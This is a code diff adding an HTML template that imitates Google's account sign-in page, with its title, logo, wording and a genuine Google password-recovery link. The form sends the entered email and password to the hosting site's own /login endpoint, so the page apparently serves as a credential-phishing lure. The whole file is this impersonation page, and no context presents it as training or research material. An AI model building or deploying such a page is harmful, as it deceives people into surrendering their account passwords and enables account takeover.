@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Sign in – Google Accounts</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body>
+  <div class="box">
+    <form action="/login" method="post" class="form">
+      <img src="{{ url_for('static', filename='images/logo.png') }}" alt="Google">
+      <h1 class="form-title">Sign in</h1>
+      <p style="text-align:center; color:#5f6368; margin-bottom:20px;">Use your Google Account</p>
+
+      <div class="form-group">
+        <input type="text" name="username" class="form-control" required autocomplete="username">
+        <label class="form-label">Email or phone</label>
+      </div>
+
+      <div class="form-group">
+        <input type="password" name="password" id="password" class="form-control" required autocomplete="current-password">
+        <label class="form-label">Enter your password</label>
+      </div>
+
+      <div class="form-group">
+        <label class="showLabel">
+          <input type="checkbox" onclick="togglePassword()"> Show password
+        </label>
+      </div>
+
+      <div class="bottom-box">
+        <a href="https://accounts.google.com/signin/recovery" target="_blank">Forgot password?</a>
+        <button type="submit" class="form-button">Next</button>
+      </div>
+    </form>
+  </div>
+
+  <script>
+    function togglePassword() {
+      const p = document.getElementById("password");
+      p.type = p.type === "password" ? "text" : "password";
+    }
+  </script>
+</body>
+</html>
